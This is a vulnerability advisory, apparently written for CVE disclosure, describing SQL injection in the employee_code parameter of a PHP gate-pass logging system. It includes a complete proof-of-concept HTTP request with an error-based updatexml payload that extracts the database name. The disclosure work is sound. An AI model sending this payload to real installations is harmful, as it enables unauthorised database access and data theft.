## Affected version: 
Employee and Visitor Gate Pass Logging System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/classes/Master.php?f=log_employee

## Description:
Employee and Visitor Gate Pass Logging System 1.0 is vulnerable to unrestricted SQL injection attacks via /employee_gatepass/classes/Master.php?f=log_employee, the controllable parameter is: employee_code. This function brings the employee_code parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /employee_gatepass/classes/Master.php?f=log_employee HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 73
Origin: http://localhost
Connection: close
Referer: http://localhost/employee_gatepass/
Cookie: PHPSESSID=pdhks4bt3kfuc877aip0m8tdmp
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23
Priority: u=1

type=1&employee_code=12' and updatexml(1,concat(0x7e,(database())),3)-- q
```
![image](https://github.com/Xu-Mingming/cve/assets/172484755/99b49182-c65e-46b0-b73e-74c80b8105cd)


Get the database name: employee_gatepass_db
## code analysis:

The employee_code parameter in Master.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.

![image](https://github.com/Xu-Mingming/cve/assets/172484755/2dbe33eb-e011-42f2-96e8-be92e6bc0d77)


